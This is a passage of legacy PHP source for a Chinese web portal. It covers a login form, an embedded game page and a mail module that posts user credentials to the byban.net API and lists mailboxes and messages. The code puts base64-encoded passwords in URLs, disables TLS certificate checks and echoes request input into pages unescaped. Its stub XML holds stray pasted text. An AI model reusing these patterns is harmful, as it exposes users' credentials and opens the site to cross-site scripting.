                        <?php if(trim(request("type"))=='file'){echo '文件';}elseif(trim(request("type"))=='dir'){echo '目录';}?>删除失败,请重试！<?php  echo $timeout/1000?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        if (count($_POST)==0)
                                echo "<p align=center><script>window.setTimeout(\"history.go(-2)\",".$timeout.");</script></p>";
                        else                            
                                echo "<p align=center><script>window.setTimeout(\"history.go(-1)\",".$timeout.");</script></p>";
                ?>
</table>                        
                <?php 
                }                       
                break;
        default :
                    if ($_SESSION["vdisk"]["uname"] != "" && $_SESSION["vdisk"]["pwd"] != "" && trim(request("uname")) == "" && trim(request("pwd")) == ""){
                        if (trim(request("api")) == "vdisk"){
                        ?>
                                <?php  redirect(ScriptPath()."?api=".trim(request("api"))."&action=".encodeuri('vdisk')."&skin=".$skincolor."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));?>
                        <?php 
                        }
                     }          
                        $style = new css();
?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath();?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="35" valign="center">
                <td align="center" valign="center" id="google">
                        <form action="<?php echo ScriptPath();?>?api=<?php echo trim(request("api"));?>&skin=<?php  echo $skincolor;?>&c=<?php echo encodeuri(trim(request("c")))?>&t=<?php echo encodeuri(trim(request("t")))?>&u=<?php echo encodeuri(trim(request("u")))?>" method="post" name="sina">
                        &nbsp用户名：<input type="text" class="text" name="uname" value="" style="height:20px;width:20%;font-size:11px" <?php  $style->textarea("#FCFC9D",""); ?>>  
                        &nbsp密码：<input type="password" class="text" name="pwd" value="" style="height:20px;width:10%;font-size:11px" <?php  $style->textarea("#FCFC9D",""); ?>> 
                        &nbsp选项：
                        <SELECT name="action" size="1" <?php  $style->selectarea("#FCFC9D","");?> style="width:60px;height:16px;font-size:12px">
                        <?php 
                        if (trim(request("api")) == "vdisk"){
                        ?>
                                <OPTION VALUE="vdisk">网盘</OPTION>
                        <?php 
                        }
                        else{
                        ?>
                                <OPTION VALUE="vdisk">网盘</OPTION>
                        <?php                         
                	}
                        ?>
                        </SELECT>
                        &nbsp验证码：<input <?php  $style->textarea("#FCFC9D",""); ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>
        </tr>   
</table>
<?php 
	break;
	}      		

$style->footer();
exit;
}
?>      


<?php 
function idoll(){ // idoll function start
header('Content-Type: text/html; charset=gb2312');
?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - 游戏");
$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>

<table width="100%" height="120%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                         IF(!is_wap())
                        	sellink("主页|插件|搜索|地球|域名|相册|网址|FTP|读书|邮箱|游戏|邮件|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|相册|网址|FTP|邮箱|邮件|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<table width="95%" height="89%" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr align="top" style="border:0">
                <td align="top" id="idoll">
                <script language="JavaScript" type="text/javascript">
                        document.getElementById('idoll').innerHTML = '<embed src="http://3.idoll.cn/game/gameEngine.php?MapId=2211" id="swfplayer" quality="high" allowscriptaccess="always" allowfullscreen="true" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="100%" height="100%" BORDER="0" />';
                </script>
                </td>
        </tr>
</table>
<?php 
$style->footer();
exit;
} // idoll function end
?>

<?php 
function byban(){
header('Content-Type: text/html; charset=gb2312');

?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - 邮件");
$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                                                IF(!is_wap())
                        	sellink("主页|插件|搜索|地球|域名|相册|网址|FTP|读书|邮箱|游戏|邮件|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|相册|网址|FTP|邮箱|邮件|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<?php 

// 每页条数
if (trim(request('pagesize')) == "")
        $pagesize = 30;
elseif (trim(request('pagesize')) > 50)
        $pagesize = 50;
else
        $pagesize = trim(request('pagesize'));

$stract = trim(request("action"));

if (trim(request("page")) != "" && is_numeric(trim(request("page"))) !== false){
        $page = floor(trim(request("page")));
}       
else{
        $page = floor("1");
}

$bybanid = "2090";

$tag = New TagAction(); 
switch (trim(request('action'))) {  // case start
        case "mailbox.list":
                        if (trim(request("uname")) == "" || trim(request("pwd")) == ""){
                                if (trim($_POST["uname"]) == "" || trim($_POST["pwd"]) == ""){
                                        AlertBack("用户名或密码为空！" , 1);
                                        break;
                                }
                                else{
                                        AlertBack("用户名或密码为空！" , 2);
                                        break;
                                }
                        }
                        If ($_SESSION['ValidCode'] != "" && trim(request("checkcode")) !="" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                                if (trim(request("checkcode")) != ""){
                                        AlertBack("四位验证码错误！" , 1);
                                        break;
                                }       
                                elseif (trim(request("checkcode")) == ""){
                                        AlertBack("四位验证码为空！" , 1);
                                        break;
                                }               
                        }
                        if (trim(request("logout")) != ""){
                                session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                                session_register("byban");
}                                 

                                $_SESSION["byban"]=array('uname' => '', 'pwd' => '');
                                //echo $_SESSION["data"]['uname'];                      
                                //session_register("uname"); 
                                //$_SESSION["uname"] = "";      
                                //session_register("pwd"); 
                                //$_SESSION["pwd"] = "";        
                                redirect(scriptpath()."?api=byban&skin=".$skincolor."&uname=&pwd=&action=".encodeuri(trim(request("action")))."&urlflag=1");
                                break;
                        }
                        elseif (trim($_POST["uname"]) != "" && trim($_POST["pwd"]) != ""){
                                session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                                session_register("byban");
}
                                $_SESSION["byban"]=array('uname' => trim(request("uname")), 'pwd' => trim(request("pwd")));                             
                                //session_register("uname"); 
                                //$_SESSION["uname"] = trim(request("uname"));  
                                //session_register("pwd"); 
                                //$_SESSION["pwd"] = trim(request("pwd"));      
                                redirect(scriptpath()."?api=byban&skin=".$skincolor."&pagesize=".encodeuri($pagesize)."&page=1&uname=".encodeuri(base64_encode(trim($_POST["uname"])))."&pwd=".encodeuri(base64_encode(trim($_POST["pwd"])))."&action=".encodeuri(trim(request("action"))));
                                break;
                        }
                        elseif ($_SESSION["byban"]["uname"] != "" && $_SESSION["byban"]["pwd"] != "" && trim(request("uname")) == "" && trim(request("pwd")) == ""){
                                redirect(scriptpath()."?api=byban&skin=".$skincolor."&uname=".encodeuri(base64_encode(trim($_SESSION["byban"]["uname"])))."&pwd=".encodeuri(base64_encode(trim($_SESSION["byban"]["pwd"])))."&action=".encodeuri(trim(request("action")))."&page=".encodeuri($page)."&pagesize=".encodeuri($pagesize));
                                break;
                        }       
                        elseif (trim(request("uname")) == "" || trim(request("pwd")) == ""){
                                redirect(scriptpath()."?api=byban&skin=".$skincolor."&uname=&pwd=&action=&checkcode=".trim(request("checkcode")));
                                break;
                        } 
                        
                        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                $xmlstr = "<?php xml version=\"1.0\" encoding=\"utf-8\" ?><dqmail><StatusInfo><Status>1</Status><ReturnCode>登陆成功</ReturnCode><ErrorDetailCode /><Version>1</Version></StatusInfo><LoginStr>6gwYX3jDfn2EBO04mBKIaO4</LoginStr></dqmail>";
                        }       
                        else{
                                $url = "http://byban.net/api/Login.ashx";
                                $data = array(
                                        'U' => base64_decode(trim(request("uname"))),
                                        'P' => base64_decode(trim(request("pwd"))),
                                        'SHOWMODE' => "1",
                                        'ENCODE' => "UTF-8",
                                        'VERSION' => "1",
                                        'EncryptUserInfo' => "",
                                        'GZIP' => "0",
                                        'PageSize' => $pagesize,
                                        'CurrentPage' => $page,
                                        'UID' => $bybanid
                                ); // 经验教训 ：数组中的数值不能用URLENCODE
                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $url);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                                $xmlstr = curl_exec($ch);
                                curl_close($ch);
                        }
                        //echo $xmlstr;
                        $xmlstr = preg_replace("/(.*)(\<\?xml version=[\'|\"]1.0[\'|\"] encoding=[\'|\"]utf-8[\'|\"][ ]*\?\>)(.*)/", "\$1"."<?php xml version=\"1.0\" encoding=\"gb2312\"?>"."\$3", $xmlstr);
                        //echo $xmlstr;
                        //return;
                        $objXml = new DOMDocument();  
                        $objXml->preserveWhiteSpace = true;
                        $objXml->async = false; 
                        $objXml->loadXML($xmlstr);
                        //echo iconv('utf-8','gb2312',$objXml->getElementsByTagName("LoginStr")->item(0)->nodeValue);
                        //return;
                        $EncryptUserInfo = urldecode(iconv('utf-8','gb2312',$objXml->getElementsByTagName("LoginStr")->item(0)->nodeValue));
                        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                $xmlstr = "<?php xml version=\"1.0\" encoding=\"utf-8\" ?><dqmail><StatusInfo><Status>1</Status><ReturnCode>登陆成功</ReturnCode><ErrorDetailCode /><Version>1</Version></StatusInfo><MailBoxList><Item><Email>00000@qq.com</Email><EncryInfo>b66kN7RA5kq/YDQOMhN</EncryInfo><AddDate>2008/2/21 21:09:48</AddDate><LastVisitTime>2009/7/22 23:32:42</LastVisitTime><LastEmailTime>2009/7/22 22:59:00</LastEmailTime><LastEmailCount>200</LastEmailCount><LoginTimes>31</LoginTimes></Item><Item><Email>00000@qq.com</Email><EncryInfo>b66kN7RA5kq/YDQOMhN</EncryInfo><AddDate>2008/2/21 21:09:48</AddDate><LastVisitTime>2009/7/22 23:32:42</LastVisitTime><LastEmailTime>2009/7/22 22:59:00</LastEmailTime><LastEmailCount>200</LastEmailCount><LoginTimes>31</LoginTimes></Item><Item><Email>00000@qq.com</Email><EncryInfo>b66kN7RA5kq/YDQOMhN</EncryInfo><AddDate>2008/2/21 21:09:48</AddDate><LastVisitTime>2009/7/22 23:32:42</LastVisitTime><LastEmailTime>2009/7/22 22:59:00</LastEmailTime><LastEmailCount>200</LastEmailCount><LoginTimes>31</LoginTimes></Item></MailBoxList></dqmail>";
                        }       
                        else{
                                $url = "http://byban.net/api/MailBoxList.ashx";
                                $data = array(
                                        'SHOWMODE' => "1",
                                        'ENCODE' => "UTF-8",
                                        'VERSION' => "1",
                                        'EncryptUserInfo' => $EncryptUserInfo,
                                        'GZIP' => "0",
                                        'PageSize' => $pagesize,
                                        'CurrentPage' => $page,
                                        'UID' => $bybanid,
                                        'SortType' => '3',
                                        'ShowLastMailInfo' => '0'
                                ); // 经验教训 ：数组中的数值不能用URLENCODE
                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $url);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                                $xmlstr = curl_exec($ch);
                                curl_close($ch);
                        }
                        //echo $xmlstr;
                        $xmlstr = preg_replace("/(.*)(\<\?xml version=[\'|\"]1.0[\'|\"] encoding=[\'|\"]utf-8[\'|\"][ ]*\?\>)(.*)/", "\$1"."<?php xml version=\"1.0\" encoding=\"gb2312\"?>"."\$3", $xmlstr);
                        //echo $xmlstr;
                        //return;
                        $objXml = new DOMDocument();  
                        $objXml->preserveWhiteSpace = true;
                        $objXml->async = false; 
                        $objXml->loadXML($xmlstr);
                        //echo $xmlstr;
                        //return;
                        $objList = $objXml->getElementsByTagName("Item");                       
                        if ($objList->length > $pagesize) $strpagesize = $pagesize; else $strpagesize = $objList->length;
                        ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3"> 查 询 结 果 : 共 <?php echo $objList->length;?> 条 </td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%"> [ <?php echo "<a style='color:#000000' href='".ScriptPath()."?api=byban&action=".encodeuri("mailbox.list")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=1&skin=".$skincolor."&EncryInfo=".encodeuri($EncryInfo)."&EncryptUserInfo=".encodeuri($EncryptUserInfo)."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])."'>邮件</a> ";?> <?php  if (trim($_SESSION["byban"]["uname"]) != "" && trim($_SESSION["byban"]["pwd"]) != "") {?> - <a style="color:#000000;"href="<?php echo scriptpath()."?api=picasa&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim(request("uname"))))."&pwd=".encodeuri(Base64_encode(trim(request("uname"))))."&action=".encodeuri(trim(request("action")))."&logout=1";?>" target="_self">退出</a><?php  } ?> ] </td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
<form name="picasa" method="post" action="">            
                        <?php 
                        $totalitem = $objList->length;
                        if (fmod($totalitem, $pagesize) == 0){
                                $totalpage=$totalitem/$pagesize;
                        }       
                        else{
                                $totalpage=ceil($totalitem/$pagesize);
                        }
                        if ($totalpage == $page)
                                $endid = $totalitem-1;
                        elseif ($totalpage > $page)
                                $endid = floor($strpagesize*($page)-1);
                        elseif ($totalpage < $page){
                                $endid = floor($strpagesize*($page-1)-1);
                        }                       
                        ?>
        <tr class="tdbg">
                <td align="center" width=4%>
                        <input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" />
                </td>   
                <td align="center" width=15%>
                        序号
                </td>
                <td align="center" width=15%>
                        邮件
                </td>
                <td align="center" width=15%>
                        邮件总数
                </td>
                <td align="center" width=15%>
                        访问次数
                </td>
                <td align="center" width=30%>
                        <a style="color:#000000" href="<?php echo ScriptPath();?>?api=picasa&action=<?php echo encodeuri("album.edit");?>&skin=<?php echo $skincolor;?>&authclientLogin=<?php echo encodeuri(trim(request("authclientLogin")));?>&uname=<?php echo encodeuri(trim(request("uname")));?>&pwd=<?php echo encodeuri(trim(request("pwd")));?>">添加</a> 搜索 <a style="color:#000000" href="javascript:delitem();">删除</a>
                </td> 
        </tr>   
                        <?php 
                        for($i = $strpagesize*($page-1);$i <= $endid;$i++){
                                $objHdd = $objList->item($i);
                        ?>
        <tr class="tdbg">
                <td align="center">
                        <input type="checkbox" name="chidd<?php echo $i;?>" id="chidd<?php echo $i;?>" value="chidd<?php echo $i;?>" />
                </td>   
                <td align="center"%>
                        <?php 
                                $email = urldecode(iconv('utf-8','gb2312',$objHdd->getElementsByTagName('Email')->item(0)->nodeValue));
                                $EncryInfo = urldecode(iconv('utf-8','gb2312',$objHdd->getElementsByTagName('EncryInfo')->item(0)->nodeValue));
                                $AddDate = urldecode(iconv('utf-8','gb2312',$objHdd->getElementsByTagName('AddDate')->item(0)->nodeValue));
                                $LastVisitTime = urldecode(iconv('utf-8','gb2312',$objHdd->getElementsByTagName('LastVisitTime')->item(0)->nodeValue));
                                $LastEmailTime = urldecode(iconv('utf-8','gb2312',$objHdd->getElementsByTagName('LastEmailTime')->item(0)->nodeValue));
                                $LastEmailCount = urldecode(iconv('utf-8','gb2312',$objHdd->getElementsByTagName('LastEmailCount')->item(0)->nodeValue));
                                $LoginTimes = urldecode(iconv('utf-8','gb2312',$objHdd->getElementsByTagName('LoginTimes')->item(0)->nodeValue));
                                echo  $i+1;
                        ?>
                </td>
                <td align="center">
                                <?php echo "<a style='color:#000000' href='".ScriptPath()."?api=byban&action=".encodeuri("mail.list")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&skin=".$skincolor."&EncryInfo=".encodeuri($EncryInfo)."&EncryptUserInfo=".encodeuri($EncryptUserInfo)."&email=".encodeuri($email)."'>".$email."</a> ";?>
                </td>
                <td align="center">
                                <?php echo $LastEmailCount;?>
                </td>
                <td align="center">
                                <?php echo $LoginTimes;?>
                </td>
                <td align="center">
                                <a style="color:#000000" href="<?php echo ScriptPath()."?api=picasa&action=".encodeuri("album.edit")."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])."&albumid=".encodeuri($albumid)."&albumtitle=".encodeuri($albumname)."&albumsummary=".encodeuri($albumsummary)."&albumlocation=".encodeuri($albumlocation)."&albumkeywords=".encodeuri($albumkeywords)."&albumaccess=".encodeuri($albumaccess)."&albumcommentingEnabled=".encodeuri($albumcommentingEnabled);?>">编辑</a> <a style="color:#000000" href="<?php echo ScriptPath()."?api=picasa&action=".encodeuri("album.remove")."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&albumid=".encodeuri($albumid)."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>">删除</a> <?php  if ($commentingenabled == "true"){?>回复<?php ;}?> 
                </td>
        </tr>   
                        <?php 
                        }
                        ?>
                </td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg">
                <td align="center" colspan="3"> 共 <?php  echo $totalpage;?> 页 第  
                        <?php 
                        echo $page." 页 ".$sCrLf;
                        if (floor($page)>1)
                                echo "<a style='color:#000000' href='".ScriptPath()."?api=byban&action=".encodeuri(trim(request("action")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page-1)."&skin=".$skincolor."&email=".encodeuri($email)."'>上一页</a> ";
                        if (floor($page)>0 && floor($page)<floor($totalpage))
                                echo "<a style='color:#000000' href='".ScriptPath()."?api=byban&action=".encodeuri(trim(request("action")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page+1)."&skin=".$skincolor."&email=".encodeuri($email)."'>下一页</a> ";

                        $gotopage = New PageChange();
                        $gotopage->CallPageChange();
                        ?>
                </td>
        </tr>   
</table>
<?php 
                        $gotopage->gotopage($totalpage,ScriptPath()."?api=byban&action=".encodeuri(trim(request("action")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".encodeuri($pagesize)."&email=".encodeuri($email)."&skin=".$skincolor."&EncryptUserInfo=".$EncryptUserInfo."&gopage=ok&page=","X3193","请在空白处输入要转到的页数");
      break;
        case "mail.list":
                        if (trim(request("logout")) != ""){
                                session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                                session_register("byban");
}
                                $_SESSION["byban"]=array('uname' => '', 'pwd' => '');
                                //session_register("uname"); 
                                //$_SESSION["uname"] = "";      
                                //session_register("pwd"); 
                                //$_SESSION["pwd"] = "";        
                                redirect(scriptpath()."?api=byban&skin=".$skincolor."&uname=&pwd=&action=".encodeuri(trim(request("action")))."&urlflag=1");
                                break;
                        }

                        //echo urldecode(trim(request("EncryptUserInfo")));
                        //return;

                        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                $xmlstr = '<?php xml version="1.0" encoding="utf-8" ?><dqmail><StatusInfo><Status>1</Status><ReturnCode>登陆成功</ReturnCode><ErrorDetailCode /><Version>1</Version></StatusInfo><PageInfo><CurrentPage>1</CurrentPage><TotalPages>19</TotalPages><PageSize>20</PageSize><TotalCounts>378</TotalCounts></PageInfo><MailList><Item><Email>hr@byban.net</Email><EncryInfo>lRxrHkZxJeLV%jDc%3d</EncryInfo>   百邮公开API接口规范    上海拜般网络科技有限公司 12 / 26<FromName>Jacky</FromName><FromEmail>Jacky@sina.com</FromEmail><EmailSubject>从传统 IE到现代 IE实战攻略(认证班)</EmailSubject><EmailTime>2009/7/30 14:47:00</EmailTime><PosID>109</PosID><EmailSize>18221</EmailSize><MsgID>12629</MsgID></Item><Item><Email>hr@byban.net</Email><EncryInfo>lRxrHkZxJeLV%jDc%3d</EncryInfo>   百邮公开API接口规范    上海拜般网络科技有限公司 12 / 26<FromName>Jacky</FromName><FromEmail>Jacky@sina.com</FromEmail><EmailSubject>从传统 IE到现代 IE实战攻略(认证班)</EmailSubject><EmailTime>2009/7/30 14:47:00</EmailTime><PosID>109</PosID><EmailSize>18221</EmailSize><MsgID>12629</MsgID></Item><Item><Email>hr@byban.net</Email><EncryInfo>lRxrHkZxJeLV%jDc%3d</EncryInfo>   百邮公开API接口规范    上海拜般网络科技有限公司 12 / 26<FromName>Jacky</FromName><FromEmail>Jacky@sina.com</FromEmail><EmailSubject>从传统 IE到现代 IE实战攻略(认证班)</EmailSubject><EmailTime>2009/7/30 14:47:00</EmailTime><PosID>109</PosID><EmailSize>18221</EmailSize><MsgID>12629</MsgID></Item></MailList></dqmail>';
                        }       
                        else{
                                $url = "http://byban.net/api/MailList.ashx";
                                $data = array(
                                        'SHOWMODE' => "1",
                                        'ENCODE' => "UTF-8",
                                        'VERSION' => "1",
                                        'EncryptUserInfo' => trim(request("EncryptUserInfo")),
                                        'GZIP' => "0",
                                        'PageSize' => $pagesize,
                                        'CurrentPage' => $page,
                                        'UID' => $bybanid,
                                        'E' => trim(request("EncryInfo")),
                                        'DayLimit' => '0',
                                        'SType' => '0',
                                        'SKeyName' => '0'
                                ); // 经验教训 ：数组中的数值不能用URLENCODE
                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $url);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                                $xmlstr = curl_exec($ch);
                                curl_close($ch);
                        }
                        //echo $xmlstr;
                        $xmlstr = preg_replace("/(.*)(\<\?xml version=[\'|\"]1.0[\'|\"] encoding=[\'|\"]utf-8[\'|\"][ ]*\?\>)(.*)/", "\$1"."<?php xml version=\"1.0\" encoding=\"gb2312\"?>"."\$3", $xmlstr);
                        //echo $xmlstr;
                        //return;
                        $objXml = new DOMDocument();  
                        $objXml->preserveWhiteSpace = true;
                        $objXml->async = false; 
                        $objXml->loadXML($xmlstr);
                        //echo $xmlstr;
                        //echo urldecode(iconv('utf-8','gb2312',$objXml->getElementsByTagName('ReturnCode')->item(0)->nodeValue));
                        //return;
                        $objList = $objXml->getElementsByTagName("Item");       
                        //echo $objList->length;        
                        //return;
                        if ($objList->length > $pagesize) $strpagesize = $pagesize; else $strpagesize = $objList->length;
                        ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3"> 查 询 结 果 : 共 <?php echo $objList->length;?> 条 </td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%"> [ <?php echo "<a style='color:#000000' href='".ScriptPath()."?api=byban&action=".encodeuri("mailbox.list")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=1&skin=".$skincolor."&EncryInfo=".encodeuri($EncryInfo)."&EncryptUserInfo=".encodeuri($EncryptUserInfo)."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])."'>邮件</a> ";?> - <?php  echo "<a style='color:#000000' href='".ScriptPath()."?api=byban&action=".encodeuri("mail.list")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page)."&skin=".$skincolor."&EncryptUserInfo=".encodeuri($EncryptUserInfo)."&email=".encodeuri(trim(request("email")))."'>".trim(request("email"))."</a> ";?> <?php  if (trim($_SESSION["byban"]["uname"]) != "" && trim($_SESSION["byban"]["pwd"]) != "") {?> - <a style="color:#000000;"href="<?php echo scriptpath()."?api=picasa&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim(request("uname"))))."&pwd=".encodeuri(Base64_encode(trim(request("uname"))))."&action=".encodeuri(trim(request("action")))."&logout=1";?>" target="_self">退出</a><?php  } ?> ] </td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
<form name="picasa" method="post" action="">            
                        <?php 
                        $totalitem = $objList->length;
                        if (fmod($totalitem, $pagesize) == 0){
                                $totalpage=$totalitem/$pagesize;
                        }       
                        else{
                                $totalpage=ceil($totalitem/$pagesize);
                        }       
                        if ($totalpage == $page)
                                $endid = $totalitem-1;
                        elseif ($totalpage > $page)
                                $endid = floor($strpagesize*($page)-1);
                        elseif ($totalpage < $page){
                                $endid = floor($strpagesize*($page-1)-1);
                        }                       
                        ?>
        <tr class="tdbg">
                <td align="center" width=4%>
                        <input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" />
                </td>   
                <td align="center" width=5%>
                        序号
                </td>
                <td align="center" width=40%>
                        邮件主题
                </td>
                <td align="center" width=20%>
                        邮件
                </td>
                <td align="center" width=10%>
                        邮件大小
                </td>
                <td align="center" width=15%>
                        <a style="color:#000000" href="<?php echo ScriptPath();?>?api=picasa&action=<?php echo encodeuri("album.edit");?>&skin=<?php echo $skincolor;?>&authclientLogin=<?php echo encodeuri(trim(request("authclientLogin")));?>&uname=<?php echo encodeuri(trim(request("uname")));?>&pwd=<?php echo encodeuri(trim(request("pwd")));?>">添加</a> 搜索 <a style="color:#000000" href="javascript:delitem();">删除</a>
                </td> 
        </tr>   
                        <?php 
                        $i = 0;
                        for($i = $strpagesize*($page-1);$i <= $endid;$i++){
                                $objHdd = $objList->item($i);
                        ?>
        <tr class="tdbg">
                <td align="center">
                        <input type="checkbox" name="chidd<?php echo $i;?>" id="chidd<?php echo $i;?>" value="chidd<?php echo $i;?>" />
                </td>   
                <td align="center"%>
                        <?php 
                                $email = urldecode(iconv('utf-8','gb2312',$objHdd->getElementsByTagName('Email')->item(0)->nodeValue));
                                $EncryInfo = urldecode(iconv('utf-8','gb2312',$objHdd->getElementsByTagName('EncryInfo')->item(0)->nodeValue));
                                $FromName = urldecode(iconv('utf-8','gb2312',$objHdd->getElementsByTagName('FromName')->item(0)->nodeValue));
                                $FromEmail = urldecode(iconv('utf-8','gb2312',$objHdd->getElementsByTagName('FromEmail')->item(0)->nodeValue));
                                $EmailSubject = urldecode(iconv('utf-8','gb2312',$objHdd->getElementsByTagName('EmailSubject')->item(0)->nodeValue));
